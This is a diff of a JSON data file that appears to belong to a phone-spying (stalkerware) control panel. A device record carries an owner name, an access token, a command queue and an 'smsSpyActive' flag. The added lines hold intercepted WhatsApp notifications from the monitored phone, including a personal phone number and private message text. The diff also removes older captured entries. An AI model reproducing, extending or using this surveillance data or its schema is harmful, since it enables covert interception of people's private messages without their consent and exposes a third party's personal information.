@@ -5404,7 +5404,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777380408689,
+    "lastSeen": 1777380411845,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -5420,6 +5420,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎262 pesan dari 2 chat",
+        "time": "28/04 19:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777380412719
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 852-3694-0729",
+        "content": "masnya gk ngomong tadi",
+        "time": "28/04 19:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777380412656
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝙹𝙱¹ 𝙰𝙻𝙻 𝙶𝙰𝙼𝙴 || 𝗚𝗨𝗡𝗔𝗪𝗔𝗡🕊️✅",
@@ -9403,22 +9419,6 @@
         "time": "28/04 06:33",
         "pkg": "com.whatsapp",
         "receivedAt": 1777332812315
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Pencadangan sedang berlangsung",
-        "content": "Menyiapkan cadangan (20%)",
-        "time": "28/04 06:33",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777332812117
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Pencadangan sedang berlangsung",
-        "content": "Menyiapkan cadangan…",
-        "time": "28/04 06:33",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777332805027
       }
     ],
     "galleryPhotos": [],
